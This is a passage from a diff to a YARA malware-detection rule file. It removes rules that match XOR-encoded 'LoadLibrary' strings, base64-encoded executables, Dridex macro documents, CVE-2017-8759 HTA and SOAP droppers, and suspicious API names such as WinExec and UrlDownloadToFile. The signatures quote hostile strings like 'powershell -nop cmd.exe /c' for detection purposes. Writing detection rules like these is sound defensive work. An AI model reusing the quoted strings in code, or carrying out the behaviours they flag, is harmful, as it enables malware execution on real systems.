-		$a245 = { (B1 | 91) 93 82 (A6 | 86) 84 99 95 (B7 | 97) 92 92 84 93 85 85 }
-		$a246 = { (B0 | 90) 92 83 (A7 | 87) 85 98 94 (B6 | 96) 93 93 85 92 84 84 }
-		$a247 = { (BF | 9F) 9D 8C (A8 | 88) 8A 97 9B (B9 | 99) 9C 9C 8A 9D 8B 8B }
-		$a248 = { (BE | 9E) 9C 8D (A9 | 89) 8B 96 9A (B8 | 98) 9D 9D 8B 9C 8A 8A }
-		$a249 = { (BD | 9D) 9F 8E (AA | 8A) 88 95 99 (BB | 9B) 9E 9E 88 9F 89 89 }
-		$a250 = { (BC | 9C) 9E 8F (AB | 8B) 89 94 98 (BA | 9A) 9F 9F 89 9E 88 88 }
-		$a251 = { (BB | 9B) 99 88 (AC | 8C) 8E 93 9F (BD | 9D) 98 98 8E 99 8F 8F }
-		$a252 = { (BA | 9A) 98 89 (AD | 8D) 8F 92 9E (BC | 9C) 99 99 8F 98 8E 8E }
-		$a253 = { (B9 | 99) 9B 8A (AE | 8E) 8C 91 9D (BF | 9F) 9A 9A 8C 9B 8D 8D }
-		$a254 = { (4D | 6D) 6E 60 65 (4D | 6D) 68 63 73 60 73 78 }  // "LoadLibrary" XOR 0x01
-		$a255 = { (4E | 6E) 6D 63 66 (4E | 6E) 6B 60 70 63 70 7B }  // "LoadLibrary" XOR 0x02
-		$a256 = { (4F | 6F) 6C 62 67 (4F | 6F) 6A 61 71 62 71 7A }  // etc...
-		$a257 = { (48 | 68) 6B 65 60 (48 | 68) 6D 66 76 65 76 7D }
-		$a258 = { (49 | 69) 6A 64 61 (49 | 69) 6C 67 77 64 77 7C }
-		$a259 = { (4A | 6A) 69 67 62 (4A | 6A) 6F 64 74 67 74 7F }
-		$a260 = { (4B | 6B) 68 66 63 (4B | 6B) 6E 65 75 66 75 7E }
-		$a261 = { (44 | 64) 67 69 6C (44 | 64) 61 6A 7A 69 7A 71 }
-		$a262 = { (45 | 65) 66 68 6D (45 | 65) 60 6B 7B 68 7B 70 }
-		$a263 = { (46 | 66) 65 6B 6E (46 | 66) 63 68 78 6B 78 73 }
-		$a264 = { (47 | 67) 64 6A 6F (47 | 67) 62 69 79 6A 79 72 }
-		$a265 = { (40 | 60) 63 6D 68 (40 | 60) 65 6E 7E 6D 7E 75 }
-		$a266 = { (41 | 61) 62 6C 69 (41 | 61) 64 6F 7F 6C 7F 74 }
-		$a267 = { (42 | 62) 61 6F 6A (42 | 62) 67 6C 7C 6F 7C 77 }
-		$a268 = { (43 | 63) 60 6E 6B (43 | 63) 66 6D 7D 6E 7D 76 }
-		$a269 = { (5C | 7C) 7F 71 74 (5C | 7C) 79 72 62 71 62 69 }
-		$a270 = { (5D | 7D) 7E 70 75 (5D | 7D) 78 73 63 70 63 68 }
-		$a271 = { (5E | 7E) 7D 73 76 (5E | 7E) 7B 70 60 73 60 6B }
-		$a272 = { (5F | 7F) 7C 72 77 (5F | 7F) 7A 71 61 72 61 6A }
-		$a273 = { (58 | 78) 7B 75 70 (58 | 78) 7D 76 66 75 66 6D }
-		$a274 = { (59 | 79) 7A 74 71 (59 | 79) 7C 77 67 74 67 6C }
-		$a275 = { (5A | 7A) 79 77 72 (5A | 7A) 7F 74 64 77 64 6F }
-		$a276 = { (5B | 7B) 78 76 73 (5B | 7B) 7E 75 65 76 65 6E }
-		$a277 = { (54 | 74) 77 79 7C (54 | 74) 71 7A 6A 79 6A 61 }
-		$a278 = { (55 | 75) 76 78 7D (55 | 75) 70 7B 6B 78 6B 60 }
-		$a279 = { (56 | 76) 75 7B 7E (56 | 76) 73 78 68 7B 68 63 }
-		$a280 = { (57 | 77) 74 7A 7F (57 | 77) 72 79 69 7A 69 62 }
-		$a281 = { (50 | 70) 73 7D 78 (50 | 70) 75 7E 6E 7D 6E 65 }
-		$a282 = { (51 | 71) 72 7C 79 (51 | 71) 74 7F 6F 7C 6F 64 }
-		$a283 = { (52 | 72) 71 7F 7A (52 | 72) 77 7C 6C 7F 6C 67 }
-		$a284 = { (53 | 73) 70 7E 7B (53 | 73) 76 7D 6D 7E 6D 66 }
-		// XOR 0x20 removed because it toggles capitalization and causes [lL]OAD[Ll]IBRARY to match.
-		$a286 = { (6D | 4D) 4E 40 45 (6D | 4D) 48 43 53 40 53 58 }
-		$a287 = { (6E | 4E) 4D 43 46 (6E | 4E) 4B 40 50 43 50 5B }
-		$a288 = { (6F | 4F) 4C 42 47 (6F | 4F) 4A 41 51 42 51 5A }
-		$a289 = { (68 | 48) 4B 45 40 (68 | 48) 4D 46 56 45 56 5D }
-		$a290 = { (69 | 49) 4A 44 41 (69 | 49) 4C 47 57 44 57 5C }
-		$a291 = { (6A | 4A) 49 47 42 (6A | 4A) 4F 44 54 47 54 5F }
-		$a292 = { (6B | 4B) 48 46 43 (6B | 4B) 4E 45 55 46 55 5E }
-		$a293 = { (64 | 44) 47 49 4C (64 | 44) 41 4A 5A 49 5A 51 }
-		$a294 = { (65 | 45) 46 48 4D (65 | 45) 40 4B 5B 48 5B 50 }
-		$a295 = { (66 | 46) 45 4B 4E (66 | 46) 43 48 58 4B 58 53 }
-		$a296 = { (67 | 47) 44 4A 4F (67 | 47) 42 49 59 4A 59 52 }
-		$a297 = { (60 | 40) 43 4D 48 (60 | 40) 45 4E 5E 4D 5E 55 }
-		$a298 = { (61 | 41) 42 4C 49 (61 | 41) 44 4F 5F 4C 5F 54 }
-		$a299 = { (62 | 42) 41 4F 4A (62 | 42) 47 4C 5C 4F 5C 57 }
-		$a300 = { (63 | 43) 40 4E 4B (63 | 43) 46 4D 5D 4E 5D 56 }
-		$a301 = { (7C | 5C) 5F 51 54 (7C | 5C) 59 52 42 51 42 49 }
-		$a302 = { (7D | 5D) 5E 50 55 (7D | 5D) 58 53 43 50 43 48 }
-		$a303 = { (7E | 5E) 5D 53 56 (7E | 5E) 5B 50 40 53 40 4B }
-		$a304 = { (7F | 5F) 5C 52 57 (7F | 5F) 5A 51 41 52 41 4A }
-		$a305 = { (78 | 58) 5B 55 50 (78 | 58) 5D 56 46 55 46 4D }
-		$a306 = { (79 | 59) 5A 54 51 (79 | 59) 5C 57 47 54 47 4C }
-		$a307 = { (7A | 5A) 59 57 52 (7A | 5A) 5F 54 44 57 44 4F }
-		$a308 = { (7B | 5B) 58 56 53 (7B | 5B) 5E 55 45 56 45 4E }
-		$a309 = { (74 | 54) 57 59 5C (74 | 54) 51 5A 4A 59 4A 41 }
-		$a310 = { (75 | 55) 56 58 5D (75 | 55) 50 5B 4B 58 4B 40 }
-		$a311 = { (76 | 56) 55 5B 5E (76 | 56) 53 58 48 5B 48 43 }
-		$a312 = { (77 | 57) 54 5A 5F (77 | 57) 52 59 49 5A 49 42 }
-		$a313 = { (70 | 50) 53 5D 58 (70 | 50) 55 5E 4E 5D 4E 45 }
-		$a314 = { (71 | 51) 52 5C 59 (71 | 51) 54 5F 4F 5C 4F 44 }
-		$a315 = { (72 | 52) 51 5F 5A (72 | 52) 57 5C 4C 5F 4C 47 }
-		$a316 = { (73 | 53) 50 5E 5B (73 | 53) 56 5D 4D 5E 4D 46 }
-		$a317 = { (0C | 2C) 2F 21 24 (0C | 2C) 29 22 32 21 32 39 }
-		$a318 = { (0D | 2D) 2E 20 25 (0D | 2D) 28 23 33 20 33 38 }
-		$a319 = { (0E | 2E) 2D 23 26 (0E | 2E) 2B 20 30 23 30 3B }
-		$a320 = { (0F | 2F) 2C 22 27 (0F | 2F) 2A 21 31 22 31 3A }
-		$a321 = { (08 | 28) 2B 25 20 (08 | 28) 2D 26 36 25 36 3D }
-		$a322 = { (09 | 29) 2A 24 21 (09 | 29) 2C 27 37 24 37 3C }
-		$a323 = { (0A | 2A) 29 27 22 (0A | 2A) 2F 24 34 27 34 3F }
-		$a324 = { (0B | 2B) 28 26 23 (0B | 2B) 2E 25 35 26 35 3E }
-		$a325 = { (04 | 24) 27 29 2C (04 | 24) 21 2A 3A 29 3A 31 }
-		$a326 = { (05 | 25) 26 28 2D (05 | 25) 20 2B 3B 28 3B 30 }
-		$a327 = { (06 | 26) 25 2B 2E (06 | 26) 23 28 38 2B 38 33 }
-		$a328 = { (07 | 27) 24 2A 2F (07 | 27) 22 29 39 2A 39 32 }
-		$a329 = { (00 | 20) 23 2D 28 (00 | 20) 25 2E 3E 2D 3E 35 }
-		$a330 = { (01 | 21) 22 2C 29 (01 | 21) 24 2F 3F 2C 3F 34 }
-		$a331 = { (02 | 22) 21 2F 2A (02 | 22) 27 2C 3C 2F 3C 37 }
-		$a332 = { (03 | 23) 20 2E 2B (03 | 23) 26 2D 3D 2E 3D 36 }
-		$a333 = { (1C | 3C) 3F 31 34 (1C | 3C) 39 32 22 31 22 29 }
-		$a334 = { (1D | 3D) 3E 30 35 (1D | 3D) 38 33 23 30 23 28 }
-		$a335 = { (1E | 3E) 3D 33 36 (1E | 3E) 3B 30 20 33 20 2B }
-		$a336 = { (1F | 3F) 3C 32 37 (1F | 3F) 3A 31 21 32 21 2A }
-		$a337 = { (18 | 38) 3B 35 30 (18 | 38) 3D 36 26 35 26 2D }
-		$a338 = { (19 | 39) 3A 34 31 (19 | 39) 3C 37 27 34 27 2C }
-		$a339 = { (1A | 3A) 39 37 32 (1A | 3A) 3F 34 24 37 24 2F }
-		$a340 = { (1B | 3B) 38 36 33 (1B | 3B) 3E 35 25 36 25 2E }
-		$a341 = { (14 | 34) 37 39 3C (14 | 34) 31 3A 2A 39 2A 21 }
-		$a342 = { (15 | 35) 36 38 3D (15 | 35) 30 3B 2B 38 2B 20 }
-		$a343 = { (16 | 36) 35 3B 3E (16 | 36) 33 38 28 3B 28 23 }
-		$a344 = { (17 | 37) 34 3A 3F (17 | 37) 32 39 29 3A 29 22 }
-		$a345 = { (10 | 30) 33 3D 38 (10 | 30) 35 3E 2E 3D 2E 25 }
-		$a346 = { (11 | 31) 32 3C 39 (11 | 31) 34 3F 2F 3C 2F 24 }
-		$a347 = { (12 | 32) 31 3F 3A (12 | 32) 37 3C 2C 3F 2C 27 }
-		$a348 = { (13 | 33) 30 3E 3B (13 | 33) 36 3D 2D 3E 2D 26 }
-		$a349 = { (2C | 0C) 0F 01 04 (2C | 0C) 09 02 12 01 12 19 }
-		$a350 = { (2D | 0D) 0E 00 05 (2D | 0D) 08 03 13 00 13 18 }
-		$a351 = { (2E | 0E) 0D 03 06 (2E | 0E) 0B 00 10 03 10 1B }
-		$a352 = { (2F | 0F) 0C 02 07 (2F | 0F) 0A 01 11 02 11 1A }
-		$a353 = { (28 | 08) 0B 05 00 (28 | 08) 0D 06 16 05 16 1D }
-		$a354 = { (29 | 09) 0A 04 01 (29 | 09) 0C 07 17 04 17 1C }
-		$a355 = { (2A | 0A) 09 07 02 (2A | 0A) 0F 04 14 07 14 1F }
-		$a356 = { (2B | 0B) 08 06 03 (2B | 0B) 0E 05 15 06 15 1E }
-		$a357 = { (24 | 04) 07 09 0C (24 | 04) 01 0A 1A 09 1A 11 }
-		$a358 = { (25 | 05) 06 08 0D (25 | 05) 00 0B 1B 08 1B 10 }
-		$a359 = { (26 | 06) 05 0B 0E (26 | 06) 03 08 18 0B 18 13 }
-		$a360 = { (27 | 07) 04 0A 0F (27 | 07) 02 09 19 0A 19 12 }
-		$a361 = { (20 | 00) 03 0D 08 (20 | 00) 05 0E 1E 0D 1E 15 }
-		$a362 = { (21 | 01) 02 0C 09 (21 | 01) 04 0F 1F 0C 1F 14 }
-		$a363 = { (22 | 02) 01 0F 0A (22 | 02) 07 0C 1C 0F 1C 17 }
-		$a364 = { (23 | 03) 00 0E 0B (23 | 03) 06 0D 1D 0E 1D 16 }
-		$a365 = { (3C | 1C) 1F 11 14 (3C | 1C) 19 12 02 11 02 09 }
-		$a366 = { (3D | 1D) 1E 10 15 (3D | 1D) 18 13 03 10 03 08 }
-		$a367 = { (3E | 1E) 1D 13 16 (3E | 1E) 1B 10 00 13 00 0B }
-		$a368 = { (3F | 1F) 1C 12 17 (3F | 1F) 1A 11 01 12 01 0A }
-		$a369 = { (38 | 18) 1B 15 10 (38 | 18) 1D 16 06 15 06 0D }
-		$a370 = { (39 | 19) 1A 14 11 (39 | 19) 1C 17 07 14 07 0C }
-		$a371 = { (3A | 1A) 19 17 12 (3A | 1A) 1F 14 04 17 04 0F }
-		$a372 = { (3B | 1B) 18 16 13 (3B | 1B) 1E 15 05 16 05 0E }
-		$a373 = { (34 | 14) 17 19 1C (34 | 14) 11 1A 0A 19 0A 01 }
-		$a374 = { (35 | 15) 16 18 1D (35 | 15) 10 1B 0B 18 0B 00 }
-		$a375 = { (36 | 16) 15 1B 1E (36 | 16) 13 18 08 1B 08 03 }
-		$a376 = { (37 | 17) 14 1A 1F (37 | 17) 12 19 09 1A 09 02 }
-		$a377 = { (30 | 10) 13 1D 18 (30 | 10) 15 1E 0E 1D 0E 05 }
-		$a378 = { (31 | 11) 12 1C 19 (31 | 11) 14 1F 0F 1C 0F 04 }
-		$a379 = { (32 | 12) 11 1F 1A (32 | 12) 17 1C 0C 1F 0C 07 }
-		$a380 = { (33 | 13) 10 1E 1B (33 | 13) 16 1D 0D 1E 0D 06 }
-		$a381 = { (CC | EC) EF E1 E4 (CC | EC) E9 E2 F2 E1 F2 F9 }
-		$a382 = { (CD | ED) EE E0 E5 (CD | ED) E8 E3 F3 E0 F3 F8 }
-		$a383 = { (CE | EE) ED E3 E6 (CE | EE) EB E0 F0 E3 F0 FB }
-		$a384 = { (CF | EF) EC E2 E7 (CF | EF) EA E1 F1 E2 F1 FA }
-		$a385 = { (C8 | E8) EB E5 E0 (C8 | E8) ED E6 F6 E5 F6 FD }
-		$a386 = { (C9 | E9) EA E4 E1 (C9 | E9) EC E7 F7 E4 F7 FC }
-		$a387 = { (CA | EA) E9 E7 E2 (CA | EA) EF E4 F4 E7 F4 FF }
-		$a388 = { (CB | EB) E8 E6 E3 (CB | EB) EE E5 F5 E6 F5 FE }
-		$a389 = { (C4 | E4) E7 E9 EC (C4 | E4) E1 EA FA E9 FA F1 }
-		$a390 = { (C5 | E5) E6 E8 ED (C5 | E5) E0 EB FB E8 FB F0 }
-		$a391 = { (C6 | E6) E5 EB EE (C6 | E6) E3 E8 F8 EB F8 F3 }
-		$a392 = { (C7 | E7) E4 EA EF (C7 | E7) E2 E9 F9 EA F9 F2 }
-		$a393 = { (C0 | E0) E3 ED E8 (C0 | E0) E5 EE FE ED FE F5 }
-		$a394 = { (C1 | E1) E2 EC E9 (C1 | E1) E4 EF FF EC FF F4 }
-		$a395 = { (C2 | E2) E1 EF EA (C2 | E2) E7 EC FC EF FC F7 }
-		$a396 = { (C3 | E3) E0 EE EB (C3 | E3) E6 ED FD EE FD F6 }
-		$a397 = { (DC | FC) FF F1 F4 (DC | FC) F9 F2 E2 F1 E2 E9 }
-		$a398 = { (DD | FD) FE F0 F5 (DD | FD) F8 F3 E3 F0 E3 E8 }
-		$a399 = { (DE | FE) FD F3 F6 (DE | FE) FB F0 E0 F3 E0 EB }
-		$a400 = { (DF | FF) FC F2 F7 (DF | FF) FA F1 E1 F2 E1 EA }
-		$a401 = { (D8 | F8) FB F5 F0 (D8 | F8) FD F6 E6 F5 E6 ED }
-		$a402 = { (D9 | F9) FA F4 F1 (D9 | F9) FC F7 E7 F4 E7 EC }
-		$a403 = { (DA | FA) F9 F7 F2 (DA | FA) FF F4 E4 F7 E4 EF }
-		$a404 = { (DB | FB) F8 F6 F3 (DB | FB) FE F5 E5 F6 E5 EE }
-		$a405 = { (D4 | F4) F7 F9 FC (D4 | F4) F1 FA EA F9 EA E1 }
-		$a406 = { (D5 | F5) F6 F8 FD (D5 | F5) F0 FB EB F8 EB E0 }
-		$a407 = { (D6 | F6) F5 FB FE (D6 | F6) F3 F8 E8 FB E8 E3 }
-		$a408 = { (D7 | F7) F4 FA FF (D7 | F7) F2 F9 E9 FA E9 E2 }
-		$a409 = { (D0 | F0) F3 FD F8 (D0 | F0) F5 FE EE FD EE E5 }
-		$a410 = { (D1 | F1) F2 FC F9 (D1 | F1) F4 FF EF FC EF E4 }
-		$a411 = { (D2 | F2) F1 FF FA (D2 | F2) F7 FC EC FF EC E7 }
-		$a412 = { (D3 | F3) F0 FE FB (D3 | F3) F6 FD ED FE ED E6 }
-		$a413 = { (EC | CC) CF C1 C4 (EC | CC) C9 C2 D2 C1 D2 D9 }
-		$a414 = { (ED | CD) CE C0 C5 (ED | CD) C8 C3 D3 C0 D3 D8 }
-		$a415 = { (EE | CE) CD C3 C6 (EE | CE) CB C0 D0 C3 D0 DB }
-		$a416 = { (EF | CF) CC C2 C7 (EF | CF) CA C1 D1 C2 D1 DA }
-		$a417 = { (E8 | C8) CB C5 C0 (E8 | C8) CD C6 D6 C5 D6 DD }
-		$a418 = { (E9 | C9) CA C4 C1 (E9 | C9) CC C7 D7 C4 D7 DC }
-		$a419 = { (EA | CA) C9 C7 C2 (EA | CA) CF C4 D4 C7 D4 DF }
-		$a420 = { (EB | CB) C8 C6 C3 (EB | CB) CE C5 D5 C6 D5 DE }
-		$a421 = { (E4 | C4) C7 C9 CC (E4 | C4) C1 CA DA C9 DA D1 }
-		$a422 = { (E5 | C5) C6 C8 CD (E5 | C5) C0 CB DB C8 DB D0 }
-		$a423 = { (E6 | C6) C5 CB CE (E6 | C6) C3 C8 D8 CB D8 D3 }
-		$a424 = { (E7 | C7) C4 CA CF (E7 | C7) C2 C9 D9 CA D9 D2 }
-		$a425 = { (E0 | C0) C3 CD C8 (E0 | C0) C5 CE DE CD DE D5 }
-		$a426 = { (E1 | C1) C2 CC C9 (E1 | C1) C4 CF DF CC DF D4 }
-		$a427 = { (E2 | C2) C1 CF CA (E2 | C2) C7 CC DC CF DC D7 }
-		$a428 = { (E3 | C3) C0 CE CB (E3 | C3) C6 CD DD CE DD D6 }
-		$a429 = { (FC | DC) DF D1 D4 (FC | DC) D9 D2 C2 D1 C2 C9 }
-		$a430 = { (FD | DD) DE D0 D5 (FD | DD) D8 D3 C3 D0 C3 C8 }
-		$a431 = { (FE | DE) DD D3 D6 (FE | DE) DB D0 C0 D3 C0 CB }
-		$a432 = { (FF | DF) DC D2 D7 (FF | DF) DA D1 C1 D2 C1 CA }
-		$a433 = { (F8 | D8) DB D5 D0 (F8 | D8) DD D6 C6 D5 C6 CD }
-		$a434 = { (F9 | D9) DA D4 D1 (F9 | D9) DC D7 C7 D4 C7 CC }
-		$a435 = { (FA | DA) D9 D7 D2 (FA | DA) DF D4 C4 D7 C4 CF }
-		$a436 = { (FB | DB) D8 D6 D3 (FB | DB) DE D5 C5 D6 C5 CE }
-		$a437 = { (F4 | D4) D7 D9 DC (F4 | D4) D1 DA CA D9 CA C1 }
-		$a438 = { (F5 | D5) D6 D8 DD (F5 | D5) D0 DB CB D8 CB C0 }
-		$a439 = { (F6 | D6) D5 DB DE (F6 | D6) D3 D8 C8 DB C8 C3 }
-		$a440 = { (F7 | D7) D4 DA DF (F7 | D7) D2 D9 C9 DA C9 C2 }
-		$a441 = { (F0 | D0) D3 DD D8 (F0 | D0) D5 DE CE DD CE C5 }
-		$a442 = { (F1 | D1) D2 DC D9 (F1 | D1) D4 DF CF DC CF C4 }
-		$a443 = { (F2 | D2) D1 DF DA (F2 | D2) D7 DC CC DF CC C7 }
-		$a444 = { (F3 | D3) D0 DE DB (F3 | D3) D6 DD CD DE CD C6 }
-		$a445 = { (8C | AC) AF A1 A4 (8C | AC) A9 A2 B2 A1 B2 B9 }
-		$a446 = { (8D | AD) AE A0 A5 (8D | AD) A8 A3 B3 A0 B3 B8 }
-		$a447 = { (8E | AE) AD A3 A6 (8E | AE) AB A0 B0 A3 B0 BB }
-		$a448 = { (8F | AF) AC A2 A7 (8F | AF) AA A1 B1 A2 B1 BA }
-		$a449 = { (88 | A8) AB A5 A0 (88 | A8) AD A6 B6 A5 B6 BD }
-		$a450 = { (89 | A9) AA A4 A1 (89 | A9) AC A7 B7 A4 B7 BC }
-		$a451 = { (8A | AA) A9 A7 A2 (8A | AA) AF A4 B4 A7 B4 BF }
-		$a452 = { (8B | AB) A8 A6 A3 (8B | AB) AE A5 B5 A6 B5 BE }
-		$a453 = { (84 | A4) A7 A9 AC (84 | A4) A1 AA BA A9 BA B1 }
-		$a454 = { (85 | A5) A6 A8 AD (85 | A5) A0 AB BB A8 BB B0 }
-		$a455 = { (86 | A6) A5 AB AE (86 | A6) A3 A8 B8 AB B8 B3 }
-		$a456 = { (87 | A7) A4 AA AF (87 | A7) A2 A9 B9 AA B9 B2 }
-		$a457 = { (80 | A0) A3 AD A8 (80 | A0) A5 AE BE AD BE B5 }
-		$a458 = { (81 | A1) A2 AC A9 (81 | A1) A4 AF BF AC BF B4 }
-		$a459 = { (82 | A2) A1 AF AA (82 | A2) A7 AC BC AF BC B7 }
-		$a460 = { (83 | A3) A0 AE AB (83 | A3) A6 AD BD AE BD B6 }
-		$a461 = { (9C | BC) BF B1 B4 (9C | BC) B9 B2 A2 B1 A2 A9 }
-		$a462 = { (9D | BD) BE B0 B5 (9D | BD) B8 B3 A3 B0 A3 A8 }
-		$a463 = { (9E | BE) BD B3 B6 (9E | BE) BB B0 A0 B3 A0 AB }
-		$a464 = { (9F | BF) BC B2 B7 (9F | BF) BA B1 A1 B2 A1 AA }
-		$a465 = { (98 | B8) BB B5 B0 (98 | B8) BD B6 A6 B5 A6 AD }
-		$a466 = { (99 | B9) BA B4 B1 (99 | B9) BC B7 A7 B4 A7 AC }
-		$a467 = { (9A | BA) B9 B7 B2 (9A | BA) BF B4 A4 B7 A4 AF }
-		$a468 = { (9B | BB) B8 B6 B3 (9B | BB) BE B5 A5 B6 A5 AE }
-		$a469 = { (94 | B4) B7 B9 BC (94 | B4) B1 BA AA B9 AA A1 }
-		$a470 = { (95 | B5) B6 B8 BD (95 | B5) B0 BB AB B8 AB A0 }
-		$a471 = { (96 | B6) B5 BB BE (96 | B6) B3 B8 A8 BB A8 A3 }
-		$a472 = { (97 | B7) B4 BA BF (97 | B7) B2 B9 A9 BA A9 A2 }
-		$a473 = { (90 | B0) B3 BD B8 (90 | B0) B5 BE AE BD AE A5 }
-		$a474 = { (91 | B1) B2 BC B9 (91 | B1) B4 BF AF BC AF A4 }
-		$a475 = { (92 | B2) B1 BF BA (92 | B2) B7 BC AC BF AC A7 }
-		$a476 = { (93 | B3) B0 BE BB (93 | B3) B6 BD AD BE AD A6 }
-		$a477 = { (AC | 8C) 8F 81 84 (AC | 8C) 89 82 92 81 92 99 }
-		$a478 = { (AD | 8D) 8E 80 85 (AD | 8D) 88 83 93 80 93 98 }
-		$a479 = { (AE | 8E) 8D 83 86 (AE | 8E) 8B 80 90 83 90 9B }
-		$a480 = { (AF | 8F) 8C 82 87 (AF | 8F) 8A 81 91 82 91 9A }
-		$a481 = { (A8 | 88) 8B 85 80 (A8 | 88) 8D 86 96 85 96 9D }
-		$a482 = { (A9 | 89) 8A 84 81 (A9 | 89) 8C 87 97 84 97 9C }
-		$a483 = { (AA | 8A) 89 87 82 (AA | 8A) 8F 84 94 87 94 9F }
-		$a484 = { (AB | 8B) 88 86 83 (AB | 8B) 8E 85 95 86 95 9E }
-		$a485 = { (A4 | 84) 87 89 8C (A4 | 84) 81 8A 9A 89 9A 91 }
-		$a486 = { (A5 | 85) 86 88 8D (A5 | 85) 80 8B 9B 88 9B 90 }
-		$a487 = { (A6 | 86) 85 8B 8E (A6 | 86) 83 88 98 8B 98 93 }
-		$a488 = { (A7 | 87) 84 8A 8F (A7 | 87) 82 89 99 8A 99 92 }
-		$a489 = { (A0 | 80) 83 8D 88 (A0 | 80) 85 8E 9E 8D 9E 95 }
-		$a490 = { (A1 | 81) 82 8C 89 (A1 | 81) 84 8F 9F 8C 9F 94 }
-		$a491 = { (A2 | 82) 81 8F 8A (A2 | 82) 87 8C 9C 8F 9C 97 }
-		$a492 = { (A3 | 83) 80 8E 8B (A3 | 83) 86 8D 9D 8E 9D 96 }
-		$a493 = { (BC | 9C) 9F 91 94 (BC | 9C) 99 92 82 91 82 89 }
-		$a494 = { (BD | 9D) 9E 90 95 (BD | 9D) 98 93 83 90 83 88 }
-		$a495 = { (BE | 9E) 9D 93 96 (BE | 9E) 9B 90 80 93 80 8B }
-		$a496 = { (BF | 9F) 9C 92 97 (BF | 9F) 9A 91 81 92 81 8A }
-		$a497 = { (B8 | 98) 9B 95 90 (B8 | 98) 9D 96 86 95 86 8D }
-		$a498 = { (B9 | 99) 9A 94 91 (B9 | 99) 9C 97 87 94 87 8C }
-		$a499 = { (BA | 9A) 99 97 92 (BA | 9A) 9F 94 84 97 84 8F }
-		$a500 = { (BB | 9B) 98 96 93 (BB | 9B) 9E 95 85 96 85 8E }
-		$a501 = { (B4 | 94) 97 99 9C (B4 | 94) 91 9A 8A 99 8A 81 }
-		$a502 = { (B5 | 95) 96 98 9D (B5 | 95) 90 9B 8B 98 8B 80 }
-		$a503 = { (B6 | 96) 95 9B 9E (B6 | 96) 93 98 88 9B 88 83 }
-		$a504 = { (B7 | 97) 94 9A 9F (B7 | 97) 92 99 89 9A 89 82 }
-		$a505 = { (B0 | 90) 93 9D 98 (B0 | 90) 95 9E 8E 9D 8E 85 }
-		$a506 = { (B1 | 91) 92 9C 99 (B1 | 91) 94 9F 8F 9C 8F 84 }
-		$a507 = { (B2 | 92) 91 9F 9A (B2 | 92) 97 9C 8C 9F 8C 87 }
-	condition:
-		any of them
-}
+import "hash"
 
-rule Base64d_PE
-{
-	meta:
-		description = "Contains a base64-encoded executable"
-		author = "Florian Roth"
-		date = "2017-04-21"
-		
-	strings:
-		$s0 = "TVqQAAIAAAAEAA8A//8AALgAAAA" wide ascii
-		$s1 = "TVqQAAMAAAAEAAAA//8AALgAAAA" wide ascii
-		
-	condition:
-		any of them
-}
 
-rule Misc_Suspicious_Strings
-{
-    meta:
-        description = "Miscellaneous malware strings"
-        author = "Ivan Kwiatkowski (@JusticeRage)"
-    strings:
-        $a0 = "backdoor" nocase ascii wide
-        $a1 = "virus" nocase ascii wide fullword
-        $a2 = "hack" nocase ascii wide fullword
-        $a3 = "exploit" nocase ascii wide
-        $a4 = "cmd.exe" nocase ascii wide
-        $a5 = "CWSandbox" nocase wide ascii // Found in some Zeus/Citadel samples
-        $a6 = "System32\\drivers\\etc\\hosts" nocase wide ascii
-    condition:
-        any of them
-}
-
-rule Dridex_Trojan_XML : maldoc {
-	meta:
-		description = "Dridex Malware in XML Document"
-		author = "Florian Roth @4nc4p"
-		reference = "https://threatpost.com/dridex-banking-trojan-spreading-via-macros-in-xml-files/111503"
-		date = "2015/03/08"
-		hash1 = "88d98e18ed996986d26ce4149ae9b2faee0bc082"
-		hash2 = "3b2d59adadf5ff10829bb5c27961b22611676395"
-		hash3 = "e528671b1b32b3fa2134a088bfab1ba46b468514"
-		hash4 = "981369cd53c022b434ee6d380aa9884459b63350"
-		hash5 = "96e1e7383457293a9b8f2c75270b58da0e630bea"
-	strings:
-		// can be ascii or wide formatted - therefore no restriction
-		$c_xml      = "<?xml version="
-		$c_word     = "<?mso-application progid=\"Word.Document\"?>"
-		$c_macro    = "w:macrosPresent=\"yes\""
-		$c_binary   = "<w:binData w:name="
-		$c_0_chars  = "<o:Characters>0</o:Characters>"
-		$c_1_line   = "<o:Lines>1</o:Lines>"
-	condition:
-		all of ($c*)
-}
 
 rule PHISH_02Dez2015_attach_P_ORD_C_10156_124658 {
 	meta:
@@ -685,31 +116,6 @@ rule Maldoc_Suspicious_OLE_target {
     $env3 = /oleObject".*Target=.*.http.*.xlx"/
   condition:
     any of them
-}
-
-rule maldoc_suspicious_strings : maldoc
-{
-    meta:
-        author = "Didier Stevens (https://DidierStevens.com)"
-    strings:
-        $a01 = "CloseHandle"
-        $a02 = "CreateFile"
-        $a03 = "GetProcAddr"
-        $a04 = "GetSystemDirectory"
-        $a05 = "GetTempPath"
-        $a06 = "GetWindowsDirectory"
-        $a07 = "IsBadReadPtr"
-        $a08 = "IsBadWritePtr"
-        $a09 = "LoadLibrary"
-        $a10 = "ReadFile"
-        $a11 = "SetFilePointer"
-        $a12 = "ShellExecute"
-        $a13 = "UrlDownloadToFile"
-        $a14 = "VirtualAlloc"
-        $a15 = "WinExec"
-        $a16 = "WriteFile"
-    condition:
-        any of them
 }
 
 rule macrocheck : maldoc
@@ -866,33 +272,6 @@ condition:
                       all of ($env*) and 4 of ($ps*) and all of ($psregex*)
               )
        )
-}
-
-rule CVE_2017_8759_Mal_HTA {
-   meta:
-      description = "Detects malicious files related to CVE-2017-8759 - file cmd.hta"
-      author = "Florian Roth"
-      reference = "https://github.com/Voulnet/CVE-2017-8759-Exploit-sample"
-      date = "2017-09-14"
-      hash1 = "fee2ab286eb542c08fdfef29fabf7796a0a91083a0ee29ebae219168528294b5"
-   strings:
-      $x1 = "Error = Process.Create(\"powershell -nop cmd.exe /c" fullword ascii
-   condition:
-      ( uint16(0) == 0x683c and filesize < 1KB and all of them )
-}
-
-rule CVE_2017_8759_SOAP_via_JS {
-   meta:
-      description = "Detects SOAP WDSL Download via JavaScript"
-      author = "Florian Roth"
-      reference = "https://twitter.com/buffaloverflow/status/907728364278087680"
-      date = "2017-09-14"
-      score = 60
-   strings:
-      $s1 = "GetObject(\"soap:wsdl=https://" ascii wide nocase
-      $s2 = "GetObject(\"soap:wsdl=http://" ascii wide nocase
-   condition:
-      ( filesize < 3KB and 1 of them )
 }
 
 rule Contains_UserForm_Object
@@ -1087,49 +466,6 @@ rule docx_macro : mail
     $header at 0 and $vbaStrings
 }
 
-rule create_process {
-    meta:
-        author = "x0r"
-        description = "Create a new process"
-	version = "0.2"
-    strings:
-        $f1 = "Shell32.dll" nocase
-        $f2 = "Kernel32.dll" nocase
-        $c1 = "ShellExecute"
-        $c2 = "WinExec"
